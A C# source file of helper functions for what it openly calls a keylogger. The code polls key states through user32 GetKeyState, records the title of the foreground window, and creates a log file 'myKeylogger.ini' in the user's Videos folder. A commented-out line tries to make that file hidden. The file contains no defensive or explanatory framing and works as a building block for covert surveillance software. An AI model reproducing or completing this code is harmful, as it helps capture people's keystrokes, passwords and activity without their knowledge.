using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace tt
{
    public static class Functions
    {
        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]

        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);
        [DllImport("user32.dll")]

        internal static extern short GetKeyState(Keys nVirtualKey);

        public static bool IsToggled(this Keys key)
        {
            return GetKeyState(key) == 0x1;
        }

        public static bool IsKeyPressed(this Keys key)
        {
            var result = GetKeyState(key);
            switch(result)
            {
                case 0: return false;
                case 1: return false;
                default: return true;
            }
        }

        public static string GetActiveWindowText()
        {
            var handle = GetForegroundWindow();
            var sb = new StringBuilder();
            GetWindowText(handle, sb, 1000);
            return sb.Length == 0 ? "UnhandleWindow" : sb.ToString();
        }

        public static void CreateFile()
        {
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini"))
                return;
            File.Create(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini").Dispose();
           // File.Create(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini", FileAttributes.Hidden);
        }
    }
}
